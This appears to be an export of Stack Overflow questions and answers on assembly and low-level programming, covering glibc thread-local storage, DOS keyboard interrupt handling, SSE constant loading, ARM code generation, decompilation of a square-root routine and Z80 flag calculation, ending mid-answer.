<p>Glibc makes its TLS entry point to a <a href=""http://fxr.watson.org/fxr/source/nptl/descr.h?v=GLIBC27;im=excerpts#L124"" rel=""noreferrer""><code>struct pthread</code></a> that contains some internal structures for threading. Glibc usually refers to a <code>struct pthread</code> variable as <code>pd</code>, presumably for <em>pthread descriptor</em>.</p>

<p>On x86-64, <code>struct pthread</code> starts with a <a href=""http://fxr.watson.org/fxr/source/nptl/sysdeps/x86_64/tls.h?v=GLIBC27;im=excerpts#L45"" rel=""noreferrer""><code>tcbhead_t</code></a> (this depends on the architecture, see the macros <a href=""http://fxr.watson.org/fxr/ident?v=GLIBC27;im=excerpts;i=TLS_DTV_AT_TP"" rel=""noreferrer""><code>TLS_DTV_AT_TP</code></a> and <a href=""http://fxr.watson.org/fxr/ident?v=GLIBC27;im=excerpts;i=TLS_TCB_AT_TP"" rel=""noreferrer""><code>TLS_TCB_AT_TP</code></a>). This Thread Control Block Header, AFAIU, contains some fields that are needed even when there is a single thread. The DTV is the Dynamic Thread Vector, and contains pointers to TLS blocks for DSOs loaded via <code>dlopen()</code>. Before or after the TCB there is a static TLS block for the executable and DSOs linked at (program's) load time. The TCB and DTV are explained pretty well in <a href=""http://www.akkadia.org/drepper/tls.pdf"" rel=""noreferrer"">Ulrich Drepper's TLS document</a> (look for the diagrams in chapter 3).</p>
","6617004"
"How to find even odd in MIPS assembly using integer registers","8701","","<p>How can I find whether the input is even or odd in MIPS? I am trying to find out using integer registers, but my program is not working. Here is the code:</p>

<pre><code>li $s1,2

div $s0,$s1

mfhi $t0

xor $t1,$t0,$0

beq $t1,0,Even

j Odd
</code></pre>

<p>But this program shows even odd numbers as even this is because the result is in decimal like 0.3 . How can I solve this issue?</p>
","<p>You need to <code>and</code> the number which you want to check with <code>0x01</code>.</p>

<p>This is how you use <code>and</code> in mips: <code>and $d, $s, $t</code> </p>

<p>If the value in target register is 1 then it is odd else even.</p>
","13476869"
"How to check keys status in x86 assembly?","8697","","<p>I took x86 assembly as a hobby this past january so I could make games that would work on old 8086-powered computers like the PCj and Tandy 1000, but the books I found don't exactly teach much on that specific topic. While some dos and bios interrupts kind of do the job, they're far from perfect.</p>

<p>My main issue is reading the keyboard status for pressed keys without halting the program. I found a few methods, but they're very limited. INT 21h, AH 0Ch reads the last pressed key, but in a text-edition fashion. Not only does it read only one key at a time, but the notepad-like hit detection makes it impossible to know how long the key has been held. I've also seen references to the ports 60h to 64h during my Google travels, but it's just that, references. Actual explanations and working code is virtually non-existent. Or maybe I'm just that bad at using search engines.</p>

<p>What I need to know is whether a key is held down or not. The best solution would be to have a buffer/array of all the keyboard keys and read its state; 1 means it's down, 0 means it's not. Or just having access to a list of the last keys to have been hit and released would be nice (with a way to clear that buffer, of course). Can anyone point me in the right direction?</p>

<p><strong>Edit:</strong> First off, I should have mentioned that I use Borland TASM. Now I compiled your code and it works great and all, even though I'm almost shy to admit I don't understand half of it. I tried to make it compatible with TASM but all it does is create garbage on the screen and freeze.</p>

<p>Here's what I came up with;</p>

<pre><code>.MODEL TINY
.STACK 256

.DATA
kbdbuf DB 128 DUP (0)

msg1 db ""Press and hold ESC"", 13, 10, ""$""
msg2 db ""ESC pressed, release ESC"", 13, 10, ""$""
msg3 db ""ESC released"", 13, 10, ""$""

.CODE
main PROC
    org 0100h
    mov ax, @data
    mov ds, ax

    xor     ax, ax
    mov     es, ax

    cli                         ; update ISR address w/ ints disabled
    push    word [es:9*4+2]     ; preserve ISR address
    push    word [es:9*4]
    lea si, irq1isr
    mov     word [es:9*4], si   ; requires a register
    mov     [es:9*4+2],cs
    sti

        mov     ah, 9
        lea     dx, msg1
        int     021h                ; print ""Press and hold ESC""

    test1:
        mov     al, [kbdbuf + 1]    ; check Escape key state (Esc scan code = 1)
        or      al, al
        jz      test1               ; wait until it's nonzero (pressed/held)

        lea     dx, msg2
        int     021h                ; print ""ESC pressed, release ESC""

    test2:
        mov     al, [kbdbuf + 1]    ; check Escape key state (Esc scan code = 1)
        or      al, al
        jnz     test2               ; wait until it's zero (released/not pressed)

        lea     dx, msg3            ; print ""ESC released""
        int     021h

    cli                         ; update ISR address w/ ints disabled
    pop     word [es:9*4]       ; restore ISR address
    pop     word [es:9*4+2]
    sti

    ret

    irq1isr:
    push    ax bx

    ; read keyboard scan code
    in      al, 060h

    ; update keyboard state
    xor     bh, bh
    mov     bl, al
    and     bl, 07Fh            ; bx = scan code
    shr     al, 7               ; al = 0 if pressed, 1 if released
    xor     al, 1               ; al = 1 if pressed, 0 if released
    mov     [cs:bx+kbdbuf], al

    ; send EOI to XT keyboard
    in      al, 061h
    mov     ah, al
    or      al, 080h
    out     061h, al
    mov     al, ah
    out     061h, al

    ; send EOI to master PIC
    mov     al, 020h
    out     020h, al

    pop     bx ax
    iret
main ENDP

END main
</code></pre>

<p>I'm not sure if I even coded the interrupt right. And heck if I know how the ports 060h - 064h work.</p>
","<p>Here's how you can do it:</p>

<pre><code>; compile with NASM: nasm.exe -f bin kbd.asm -o kbd.com

bits 16
org 0x100

    xor     ax, ax
    mov     es, ax

    cli                         ; update ISR address w/ ints disabled
    push    word [es:9*4+2]     ; preserve ISR address
    push    word [es:9*4]
    mov     word [es:9*4], irq1isr
    mov     [es:9*4+2],cs
    sti

    call    test

    cli                         ; update ISR address w/ ints disabled
    pop     word [es:9*4]       ; restore ISR address
    pop     word [es:9*4+2]
    sti

    ret

test:
    mov     ah, 9
    mov     dx, msg1
    int     0x21                ; print ""Press and hold ESC""

test1:
    mov     al, [kbdbuf + 1]    ; check Escape key state (Esc scan code = 1)
    or      al, al
    jz      test1               ; wait until it's nonzero (pressed/held)

    mov     dx, msg2
    int     0x21                ; print ""ESC pressed, release ESC""

test2:
    mov     al, [kbdbuf + 1]    ; check Escape key state (Esc scan code = 1)
    or      al, al
    jnz     test2               ; wait until it's zero (released/not pressed)

    mov     dx, msg3            ; print ""ESC released""
    int     0x21

    ret

irq1isr:
    pusha

    ; read keyboard scan code
    in      al, 0x60

    ; update keyboard state
    xor     bh, bh
    mov     bl, al
    and     bl, 0x7F            ; bx = scan code
    shr     al, 7               ; al = 0 if pressed, 1 if released
    xor     al, 1               ; al = 1 if pressed, 0 if released
    mov     [cs:bx+kbdbuf], al

    ; send EOI to XT keyboard
    in      al, 0x61
    mov     ah, al
    or      al, 0x80
    out     0x61, al
    mov     al, ah
    out     0x61, al

    ; send EOI to master PIC
    mov     al, 0x20
    out     0x20, al

    popa
    iret

kbdbuf:
    times   128 db 0

msg1 db ""Press and hold ESC"", 13, 10, ""$""
msg2 db ""ESC pressed, release ESC"", 13, 10, ""$""
msg3 db ""ESC released"", 13, 10, ""$""
</code></pre>

<p>Run it in DOS/Win9x/NT/2K/XP/32-bit Vista/7 or DosBox.</p>

<p><strong>UPDATE:</strong> TASM version:</p>

<pre><code>; file: kbdt.asm
; compile with TASM/TLINK:
;   tasm.exe kbdt.asm
;   tlink.exe /t kbdt.obj

.286

code segment use16
assume cs:code, ds:code, ss:code
org 100h

main:
    xor     ax, ax
    mov     es, ax

    cli                         ; update ISR address w/ ints disabled
    push    word ptr es:[9*4+2]     ; preserve ISR address
    push    word ptr es:[9*4]
    mov     word ptr es:[9*4], offset irq1isr
    mov     es:[9*4+2],cs
    sti

    call    test0

    cli                         ; update ISR address w/ ints disabled
    pop     word ptr es:[9*4]   ; restore ISR address
    pop     word ptr es:[9*4+2]
    sti

    ret

test0:
    mov     ah, 9
    mov     dx, offset msg1
    int     21h                 ; print ""Press and hold ESC""

test1:
    mov     al, [kbdbuf + 1]    ; check Escape key state (Esc scan code = 1)
    or      al, al
    jz      test1               ; wait until it's nonzero (pressed/held)

    mov     dx, offset msg2
    int     21h                 ; print ""ESC pressed, release ESC""

test2:
    mov     al, [kbdbuf + 1]    ; check Escape key state (Esc scan code = 1)
    or      al, al
    jnz     test2               ; wait until it's zero (released/not pressed)

    mov     dx, offset msg3     ; print ""ESC released""
    int     21h

    ret

irq1isr:
    pusha

    ; read keyboard scan code
    in      al, 60h

    ; update keyboard state
    xor     bh, bh
    mov     bl, al
    and     bl, 7Fh             ; bx = scan code
    shr     al, 7               ; al = 0 if pressed, 1 if released
    xor     al, 1               ; al = 1 if pressed, 0 if released
    mov     cs:[bx+kbdbuf], al

    ; send EOI to XT keyboard
    in      al, 61h
    mov     ah, al
    or      al, 80h
    out     61h, al
    mov     al, ah
    out     61h, al

    ; send EOI to master PIC
    mov     al, 20h
    out     20h, al

    popa
    iret

kbdbuf      db 128 dup (0)

msg1 db ""Press and hold ESC"", 13, 10, ""$""
msg2 db ""ESC pressed, release ESC"", 13, 10, ""$""
msg3 db ""ESC released"", 13, 10, ""$""

code ends

end main
</code></pre>
","10525397"
"I need ascii hex codes for arrows (right,left,down,up)","8694","","<p>I need ascii hex codes for arrows (right,left,down,up). I am making software in Assembler and i need ascii code for arrow keys. </p>
","<p>Those are the character codes for arrow characters in the lower portion of the ASCII codepage.</p>

<ul>
<li>Up: 0x18</li>
<li>Down: 0x19</li>
<li>Right: 0x1A</li>
<li>Left: 0x1B</li>
</ul>

<p>And the scan codes are:</p>

<ul>
<li>Up: 0x48</li>
<li>Left: 0x4B</li>
<li>Right: 0x4D</li>
<li>Down: 0x50 </li>
</ul>

<p>The latter are used, for example, with BIOS interrupt 16h. In general, key presses don't necessarily correspond to ASCII characters. In case of arrow keys, especially so. Whatever Linux thinks, neither keyboard nor screen are byte streams.</p>
","23188621"
"How hard is it (really) to decompile assembly code?","8647","","<p>I'm trying to find hard facts that will help my management understand how hard/easy it is to reverse-engineer compiled C code.</p>

<p>Similar questions have been asked before on this site (see e.g. <a href=""https://stackoverflow.com/questions/273145/is-it-possible-to-decompile-a-windows-exe-or-at-least-view-the-assembly"">Is it possible to “decompile” a Windows .exe? Or at least view the Assembly?</a> or <a href=""https://stackoverflow.com/questions/8601355/possible-to-decompile-dll-written-in-c"">Possible to decompile DLL written in C?</a>), but the gist of these questions is that decompiling compiled C code is ""hard, but not entirely impossible"".</p>

<p>In order to facilitate answers that are based in fact, I am including compiled code for a mystery function, and I propose that answers to this question measure the success or failure of the proposed techniques by whether they can determine what this function does.  This may be unusual for SO but I think it's the best way to get ""good subjective"" or factual answers to this engineering question.  Therefore, <strong>What is your best guess at what this function is doing, and how?</strong></p>

<p>This is the compiled code, compiled on Mac OSX with gcc:</p>

<pre><code>_mystery:
Leh_func_begin1:
    pushq   %rbp
Ltmp0:
    movq    %rsp, %rbp
Ltmp1:
    movsd   LCPI1_0(%rip), %xmm1
    subsd   %xmm0, %xmm1
    pxor    %xmm2, %xmm2
    ucomisd %xmm1, %xmm2
    jbe     LBB1_2
    xorpd   LCPI1_1(%rip), %xmm1
LBB1_2:
    ucomisd LCPI1_2(%rip), %xmm1
    jb      LBB1_8
    movsd   LCPI1_0(%rip), %xmm1
    movsd   LCPI1_3(%rip), %xmm2
    pxor    %xmm3, %xmm3
    movsd   LCPI1_1(%rip), %xmm4
    jmp     LBB1_4
    .align  4, 0x90
LBB1_5:
    ucomisd LCPI1_2(%rip), %xmm1
    jb      LBB1_9
    movapd  %xmm5, %xmm1
LBB1_4:
    movapd  %xmm0, %xmm5
    divsd   %xmm1, %xmm5
    addsd   %xmm1, %xmm5
    mulsd   %xmm2, %xmm5
    movapd  %xmm5, %xmm1
    mulsd   %xmm1, %xmm1
    subsd   %xmm0, %xmm1
    ucomisd %xmm1, %xmm3
    jbe     LBB1_5
    xorpd   %xmm4, %xmm1
    jmp     LBB1_5
LBB1_8:
    movsd   LCPI1_0(%rip), %xmm5
LBB1_9:
    movapd  %xmm5, %xmm0
    popq    %rbp
    ret 
Leh_func_end1:
</code></pre>

<p><strong>UPDATE</strong></p>

<p>@Igor Skochinsky is the first to find the right answer: it is indeed a naive implementation of Heron's algorithm for calculating square roots. The original source code is here:</p>

<pre><code>#include &lt;stdio.h&gt;

#define EPS 1e-7

double mystery(double x){
  double y=1.;
  double diff;
  diff=y*y-x;
  diff=diff&lt;0?-diff:diff;
  while(diff&gt;=EPS){
    y=(y+x/y)/2.;
    diff=y*y-x;
    diff=diff&lt;0?-diff:diff;
  }
  return y;
}

int main() {
  printf(""The square root of 2 is %g\n"", mystery(2.));
}
</code></pre>
","<p>Here's the results of decompilation with the <a href=""http://www.hex-rays.com/products/decompiler/"">Hex-Rays Decompiler</a> after I converted code to x86 (it does not support x64 at the moment), added some data definitions missing in the original post, and assembled it:</p>

<pre><code>//-------------------------------------------------------------------------
// Data declarations

double LCPI1_0 =  1.0; // weak
double LCPI1_1[2] = {  0.0,  0.0 }; // weak
double LCPI1_2 =  1.2; // weak
double LCPI1_3 =  1.3; // weak


//----- (00000000) --------------------------------------------------------
void __usercall mystery(__m128d a1&lt;xmm0&gt;)
{
  __m128d v1; // xmm1@1
  __m128d v2; // xmm1@4
  __int128 v3; // xmm2@4
  __m128d v4; // xmm5@7
  __m128d v5; // xmm1@7

  v1 = (__m128d)*(unsigned __int64 *)&amp;LCPI1_0;
  v1.m128d_f64[0] = LCPI1_0 - a1.m128d_f64[0];
  if ( LCPI1_0 - a1.m128d_f64[0] &lt; 0.0 )
    v1 = _mm_xor_pd(v1, *(__m128d *)LCPI1_1);
  if ( v1.m128d_f64[0] &gt;= LCPI1_2 )
  {
    v2 = (__m128d)*(unsigned __int64 *)&amp;LCPI1_0;
    v3 = *(unsigned __int64 *)&amp;LCPI1_3;
    while ( 1 )
    {
      v4 = a1;
      v4.m128d_f64[0] = (v4.m128d_f64[0] / v2.m128d_f64[0] + v2.m128d_f64[0]) * *(double *)&amp;v3;
      v5 = v4;
      v5.m128d_f64[0] = v5.m128d_f64[0] * v5.m128d_f64[0] - a1.m128d_f64[0];
      if ( v5.m128d_f64[0] &lt; 0.0 )
        v5 = _mm_xor_pd(a1, (__m128d)*(unsigned __int64 *)LCPI1_1);
      if ( v5.m128d_f64[0] &lt; LCPI1_2 )
        break;
      v2 = a1;
    }
  }
}
// 90: using guessed type double LCPI1_0;
// 98: using guessed type double LCPI1_1[2];
// A8: using guessed type double LCPI1_2;
// B0: using guessed type double LCPI1_3;

// ALL OK, 1 function(s) have been successfully decompiled
</code></pre>

<p>Clearly, it could use some improvement (XMM support is somewhat basic right now), but I think the basic algorithm is already understandable.</p>

<p><strong>Edit</strong>: since it's apparent that only the low double of all XMM registers is used, it seems the function actually works with scalar doubles and not vectors. As for the _mm_xor_pd (xorpd) intrinsic, I think it's just the way the compiler implements sign inversion - by xoring with a predefined constant which has 1s in sign bit positions and 0s everywhere else. With the above in mind, and after some cleanup, I get the following code:</p>

<pre><code>double mystery(double a1)
{
  double v1; // xmm1@1
  double v2; // xmm1@4
  double v3; // xmm2@4
  double v4; // xmm5@7
  double v5; // xmm1@7

  v1 = LCPI1_0 - a1;
  if ( v1 &lt; 0.0 )
    v1 = -v1;
  if ( v1 &lt; LCPI1_2 )
  {
    v4 = LCPI1_0;
  }
  else
  {
    v2 = LCPI1_0;
    v3 = LCPI1_3;
    while ( 1 )
    {
      v4 = a1;
      v4 = (v4 / v2 + v2) * v3;
      v5 = v4;
      v5 = v5 * v5 - a1;
      if ( v5 &lt; 0.0 )
        v5 = -v5;
      if ( v5 &lt; LCPI1_2 )
        break;
      v2 = a1;
    }
  }
  return v4;
}
</code></pre>

<p>It produces assembly pretty similar to the original post.</p>
","14323305"
"Load constant floats into SSE registers","8634","","<p>I'm trying to figure out an efficient way to load compile time constant floats into SSE(2/3) registers. I've tried doing simple code like this,</p>

<pre><code>const __m128 x = { 1.0f, 2.0f, 3.0f, 4.0f }; 
</code></pre>

<p>but that generates 4 movss instructions from memory!</p>

<pre><code>movss       xmm0,dword ptr [__real@3f800000 (14048E534h)] 
movss       xmm1,dword ptr [__real@40000000 (14048E530h)] 
movaps      xmm6,xmm12 
shufps      xmm6,xmm12,0C6h 
movss       dword ptr [rsp],xmm0 
movss       xmm0,dword ptr [__real@40400000 (14048E52Ch)] 
movss       dword ptr [rsp+4],xmm1 
movss       xmm1,dword ptr [__real@40a00000 (14048E528h)] 
</code></pre>

<p>which load the scalars in and out of memory... (?!?!)</p>

<p>Doing this though..</p>

<pre><code>float Align(16) myfloat4[4] = { 1.0f, 2.0f, 3.0f, 4.0f, }; // out in global scope
</code></pre>

<p>generates.</p>

<pre><code>movaps      xmm5,xmmword ptr [::myarray4 (140512050h)]
</code></pre>

<p>Ideally, it would be nice if I have constants their would be a way not to even touch memory and just do it with immediate style instructions (e.g. the constants compiled into the instruction itself).</p>

<p>Thanks</p>
","<p>If you want to force it to a single load, you could try (gcc):</p>

<pre><code>__attribute__((aligned(16))) float vec[4] = { 1.0f, 1.1f, 1.2f, 1.3f };
__m128 v = _mm_load_ps(vec); // edit by sor: removed the ""&amp;"" cause its already an address
</code></pre>

<p>If you have Visual C++, use <code>__declspec(align(16))</code> to request the proper constraint.</p>

<p>On my system, this (compiled with <code>gcc -m32 -msse -O2</code>; no optimization at all clutters the code but still retains the single <code>movaps</code> in the end) creates the following assembly code (gcc / AT&amp;T syntax):</p>

<pre><code>    andl    $-16, %esp
    subl    $16, %esp
    movl    $0x3f800000, (%esp)
    movl    $0x3f8ccccd, 4(%esp)
    movl    $0x3f99999a, 8(%esp)
    movl    $0x3fa66666, 12(%esp)
    movaps  (%esp), %xmm0
</code></pre>

<p>Note that it aligns the stackpointer before allocating stackspace and putting the constants in there. Leaving the <code>__attribute__((aligned))</code> out may, depending on your compiler, create incorrect code that doesn't do this, so beware, and check the disassembly.</p>

<p>Additionally:<br>
Since you've been asking for <em>how to put constants into the code</em>, simply try the above with a <code>static</code> qualifier for the <code>float</code> array. That creates the following assembly:</p>

<pre><code>    movaps  vec.7330, %xmm0
    ...
vec.7330:
    .long   1065353216
    .long   1066192077
    .long   1067030938
    .long   1067869798
</code></pre>
","5019838"
"In C, accessing my array index is faster or accessing by pointer is faster?","8627","","<p>In C, accessing an array index is faster or accessing by pointer is faster?
By faster I mean, which one would take less clock cycle.
The array is not an constant array.</p>
","<p>templatetypedef has summed it up.  To add some support to his response.  Take these example functions:</p>

<pre>
unsigned int fun1 ( unsigned int *x )
{
    unsigned int ra,rb;

    rb=0;
    for(ra=0;ra&lt;1000;ra++) rb+=*x++;
    return(rb);
}

unsigned int fun2 ( unsigned int *x )
{
    unsigned int ra,rb;
    rb=0;
    for(ra=0;ra&lt;1000;ra++) rb+=x[ra];
    return(rb);
}
</pre>

<p>Now gcc produced this:</p>

<pre>
00000000 fun1:
   0:   e52d4004    push    {r4}        ; (str r4, [sp, #-4]!)
   4:   e1a03000    mov r3, r0
   8:   e2804efa    add r4, r0, #4000   ; 0xfa0
   c:   e3a00000    mov r0, #0
  10:   e1a02003    mov r2, r3
  14:   e492c004    ldr ip, [r2], #4
  18:   e5931004    ldr r1, [r3, #4]
  1c:   e2823004    add r3, r2, #4
  20:   e080000c    add r0, r0, ip
  24:   e1530004    cmp r3, r4
  28:   e0800001    add r0, r0, r1
  2c:   1afffff7    bne 10 
  30:   e49d4004    pop {r4}        ; (ldr r4, [sp], #4)
  34:   e12fff1e    bx  lr

00000038 fun2:
  38:   e3a03000    mov r3, #0
  3c:   e1a02003    mov r2, r3
  40:   e790c003    ldr ip, [r0, r3]
  44:   e2833004    add r3, r3, #4
  48:   e7901003    ldr r1, [r0, r3]
  4c:   e2833004    add r3, r3, #4
  50:   e082200c    add r2, r2, ip
  54:   e3530efa    cmp r3, #4000   ; 0xfa0
  58:   e0822001    add r2, r2, r1
  5c:   1afffff7    bne 40 
  60:   e1a00002    mov r0, r2
  64:   e12fff1e    bx  lr
</pre>

<p>The code is different, but I am surprised at the missed opportunities for optimization.</p>

<p>Clang/llvm produced this:</p>

<pre>

00000000 fun1:
   0:   e3a01000    mov r1, #0
   4:   e3a02ffa    mov r2, #1000   ; 0x3e8
   8:   e1a03001    mov r3, r1
   c:   e2522001    subs    r2, r2, #1
  10:   e490c004    ldr ip, [r0], #4
  14:   e08c3003    add r3, ip, r3
  18:   e2c11000    sbc r1, r1, #0
  1c:   e182c001    orr ip, r2, r1
  20:   e35c0000    cmp ip, #0
  24:   1afffff8    bne c 
  28:   e1a00003    mov r0, r3
  2c:   e12fff1e    bx  lr

00000030 fun2:
  30:   e3a01000    mov r1, #0
  34:   e3a02ffa    mov r2, #1000   ; 0x3e8
  38:   e1a03001    mov r3, r1
  3c:   e2522001    subs    r2, r2, #1
  40:   e490c004    ldr ip, [r0], #4
  44:   e08c3003    add r3, ip, r3
  48:   e2c11000    sbc r1, r1, #0
  4c:   e182c001    orr ip, r2, r1
  50:   e35c0000    cmp ip, #0
  54:   1afffff8    bne 3c
  58:   e1a00003    mov r0, r3
  5c:   e12fff1e    bx  lr
</pre>

<p>You might notice that the compiler produced the exact same code, pointer or offset.  And by changing compilers I was better off than changing pointer vs array indexing.  I think llvm could have done a little better, I will need study this some more to understand what my code did to cause this.</p>

<p>EDIT:</p>

<p>I was hoping to get the compiler to at a minimum use the ldr rd,[rs],#4 instruction which favors pointers, and hoped the compiler would see that it could destroy the array address thus treating it like a pointer rather than an offset into an array (and use the above instruction, which is basically what clang/llvm did).  Or if it did the array thing that it would use the ldr rd,[rm,rn] instruction.  Basically was hoping one of the compilers would generate one of these solutions:</p>

<pre>

funa:
    mov r1,#0
    mov r2,#1000
funa_loop:
    ldr r3,[r0],#4
    add r1,r1,r3
    subs r2,r2,#1
    bne funa_loop
    mov r0,r1
    bx lr

funb:
    mov r1,#0
    mov r2,#0
funb_loop:
    ldr r3,[r0,r2]
    add r1,r1,r3
    add r2,r2,#4
    cmp r2,#0x4000
    bne funb_loop
    mov r0,r1
    bx lr

func:
    mov r1,#0
    mov r2,#4000
    subs r2,r2,#4
func_loop:
    beq func_done
    ldr r3,[r0,r2]
    add r1,r1,r3
    subs r2,r2,#4
    b func_loop
func_done:
    mov r0,r1
    bx lr

</pre>

<p>Didnt quite get there but got pretty close.  This was a fun exercise.  Note the above is all ARM assembler. </p>

<p>In general, (not my specific C code example and not necessarily an ARM), a number of the popular architectures you will have a load from a register based address (ldr r0,[r1]) and a load with a register index/offset (ldr r0,[r1,r2]) where the address is the sum of the two registers.  one register ideally is the base address of the array and the second the index/offset.  The former load from register lends itself to pointers, the latter to arrays. if your C program is NOT going to change or move the pointer or index, then in both cases that means a static address which is computed then a normal load is used, both array and pointer should produce the same instructions.  For the more interesting case of changing the pointer/index.</p>

<pre>
Pointer

ldr r0,[r1]
...
add r1,r1,some number

Array index

ldr r0,[r1,r2]
...
add r2,r2,some number
</pre>

<p>(replace the load with a store and the add with a sub as needed)</p>

<p>Some architectures do not have a three register register index instruction so there you have to do something like</p>

<pre>
array index:
mov r2,r1
...
ldr r0,[r2]
...
add r2,r2,some number
</pre>

<p>Or depending on the compiler it can get really bad, esp if you compile for debugging or without optimizations, and assuming you dont have a three register add</p>

<pre>
array index:
mov r2,#0
...
mov r3,r1
add r3,r2
ldr r4,[r3]
...
add r2,some number
</pre>

<p>So it is quite possible that the two approaches are equal.  As seen on the ARM, it can combine the two (within limits for the immediate) pointer instructions into one, making that a little faster.  The array index solution burns more registers, and depending on the number of available registers for the architecture that pushes you toward having to swap registers out to the stack sooner and more often (than you would with pointers), slowing you down even more.  If you dont mind destroying the base address, the bottom line is the pointer solution <em>might</em> give you an advantage from a performance perspective.  It has a lot to do with your code and the compiler.  For me it readability comes into play and I feel arrays are easier to read and follow, and second do I need to preserve that pointer to free a malloc or to go through that memory again, etc.  If so I will probably use an array with an index, if it is a one time pass and I dont care about destroying the base address I will use a pointer.  As you saw above with the compiler generated code, if performance is critical, then hand code the solution in assembler anyway (based on suggested approaches by letting the compilers try it first).</p>
","4946584"
"What is the most efficient way to set one bit of a register in ARM?","8613","","<p>I'm writing ARM assembly code that at some point has to set a single bit of a register to 1. This is best done of course via ""register-<code>or</code>-bitmask"" method. However, according to ARM documentation, the Assembly <code>ORR</code> command (bitwise OR) does <em>not</em> take immediate values. In other words you can only bitwise-OR a value in one register with a value in another register. When you think about it, it makes sense because ARM instructions are themselves 32-bit long, so there's no way to cram a 32-bit mask into an instruction. However, writing an immediate value to a register just to use it right a way is inefficient because it produces a <a href=""http://en.wikipedia.org/wiki/Hazard_%28computer_architecture%29#Read_After_Write_.28RAW.29"" rel=""nofollow"">read-after-write</a> hazard which stalls the CPU. In general, what is the most efficient way to <code>ORR</code> a register with a mask without wasting a register on constantly keeping that mask in memory? Does ARM recommend anything?</p>
","<pre><code>ORR r0, r1, #0x4
</code></pre>

<p>is perfectly fine in standard ARM. You can encode immediate values in a 32-bit ARM instruction, but their range is limited. <a href=""http://www.davespace.co.uk/arm/introduction-to-arm/immediates.html"" rel=""nofollow"">See this explanation</a>.</p>

<p>Your link points to the Thumb documentation; are you sure you need to be using Thumb instructions?</p>
","7687693"
"What does the @data directive mean in MASM?","8606","","<p>I have come across the following directive in some assembly code:</p>

<pre><code>mov    ax, @data
</code></pre>

<p>I've gone through my assembler book and tried some Googl-ing, but can't find a definition.</p>

<p>Thanks,</p>

<p>Scott</p>
","<p><code>@data</code> is a macro for the default data group, which is only relevant if you're not using the <code>FLAT</code> model.</p>

<p>The code you provided is typically followed by <code>mov ds, ax</code>, which sets up the data segment register for the current executable.</p>

<p>(MSDN reference at <a href=""http://msdn.microsoft.com/en-us/library/a438740c.aspx"" rel=""nofollow noreferrer"">@data</a>.)</p>
","4928861"
"Overflow and Carry flags on Z80","8574","","<p>I have gotten round to implementing the ADD A,r set of opcodes on my Z80 core. I had a bit of confusion about the carry and overflow flags which I think I've nailed, but I wanted to put it to the community to check that I'm right.</p>

<p>Basically, from what I can see, the ALU in the Z80 doesn't care about signed/unsigned operations, it just adds bits. This means that if two 8-bit values are added together and cause a 9-bit value as a result of their addition, the carry flag will be set. This includes adding two negative two's complement numbers, for example -20 (11101100) and -40 (11011000), as although the result is -60 (11000100), the result is actually a 9-bit value 1 1100 0100. This surely means if adding two negative two's complement values, the carry flag will always be set, even when there is no overflow condition - am I right?</p>

<p>Secondly, I decided that to detect an overflow in this instruction, I would XOR bit 7 of both operands, and if the result was 10000000, then there is definitely no overflow - if the result of this is 00000000 then there could be an overflow as the signs are the same, and I would therefore XOR bit 7 of the result of the addition with bit 7 of either operand, and if the result of this is 10000000 then an overflow has occurred and I set the P/V overflow flag. Am I right here also?</p>

<p>Sorry for such a convoluted question, I'm pretty sure I'm right but I need to know before I carry on with countless more instructions based on this logic. Many thanks.</p>
","<p>The bits of the result are obtained from the truncated sum of unsigned integers. The add instruction doesn't care about the sign here nor does it care about your own interpretation of the integers as signed or unsigned. It just adds as if the numbers were unsigned.</p>

<p>The carry flag (or borrow in case of subtraction) is that non-existent 9th bit from the addition of the 8-bit unsigned integers. Effectively, this flag signifies an overflow/underflow for add/sub of unsigned integers. Again, add doesn't care about the signs here at all, it just adds as if the numbers were unsigned.</p>

<p>Adding two negative 2's complement numbers will result in setting of the carry flag to 1, correct.</p>

<p>The overflow flag shows whether or not there's been an overflow/underflow for add/sub of signed integers. To set the overflow flag the instruction treats the numbers as signed (just like it treats them as unsigned for the carry flag and the 8 bits of the result).</p>

<p>The idea behind setting the overflow flag is simple. Suppose you sign-extend your 8-bit signed integers to 9 bits, that is, just copy the 7th bit to an extra, 8th bit. An overflow/underflow will occur if the 9-bit sum/difference of these 9-bit signed integers has different values in bits 7 and 8, meaning that the addition/subtraction has lost the result's sign in the 7th bit and used it for the result's magnitude, or, in other words, the 8 bits can't accommodate the sign bit and such a large magnitude.</p>

<p>Now, bit 7 of the result can differ from the imaginary sign bit 8 if and only if the carry into bit 7 and the carry into bit 8 (=carry out of bit 7) are different. That's because we start with the addends having bit 7=bit 8 and only different carry-ins into them can affect them in the result in different ways.</p>

<p>So overflow flag = carry-out flag XOR carry from bit 6 into bit 7.</p>

<p>Both my and your ways of calculating the overflow flag are correct. In fact, both are described in the <a href=""http://www.zilog.com/docs/z80/um0080.pdf"" rel=""noreferrer"">Z80 CPU User's Manual</a> in section ""Z80 Status Indicator Flags"".</p>

<p>Here's how you can emulate most of the ADC instruction in C, where you don't have direct access to the CPU's flags and can't take full advantage of the emulating CPU's ADC instruction:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;limits.h&gt;

#if CHAR_BIT != 8
#error char expected to have exactly 8 bits.
#endif

typedef unsigned char uint8;
typedef signed char int8;

#define FLAGS_CY_SHIFT 0
#define FLAGS_OV_SHIFT 1
#define FLAGS_CY_MASK  (1 &lt;&lt; FLAGS_CY_SHIFT)
#define FLAGS_OV_MASK  (1 &lt;&lt; FLAGS_OV_SHIFT)

void Adc(uint8* acc, uint8 b, uint8* flags)
{
  uint8 a = *acc;
  uint8 carryIns;
  uint8 carryOut;

  // Calculate the carry-out depending on the carry-in and addends.
  //
  // carry-in = 0: carry-out = 1 IFF (a + b &gt; 0xFF) or,
  //   equivalently, but avoiding overflow in C: (a &gt; 0xFF - b).
  //
  // carry-in = 1: carry-out = 1 IFF (a + b + 1 &gt; 0xFF) or,
  //   equivalently, (a + b &gt;= 0xFF) or,
  //   equivalently, but avoiding overflow in C: (a &gt;= 0xFF - b).
  //
  // Also calculate the sum bits.
  if (*flags &amp; FLAGS_CY_MASK)
  {
    carryOut = (a &gt;= 0xFF - b);
    *acc = a + b + 1;
  }
  else
  {
    carryOut = (a &gt; 0xFF - b);
    *acc = a + b;
  }

#if 0
  // Calculate the overflow by sign comparison.
  carryIns = ((a ^ b) ^ 0x80) &amp; 0x80;
  if (carryIns) // if addend signs are different
  {
    // overflow if the sum sign differs from the sign of either of addends
    carryIns = ((*acc ^ a) &amp; 0x80) != 0;
  }
#else
  // Calculate all carry-ins.
  // Remembering that each bit of the sum =
  //   addend a's bit XOR addend b's bit XOR carry-in,
  // we can work out all carry-ins from a, b and their sum.
  carryIns = *acc ^ a ^ b;

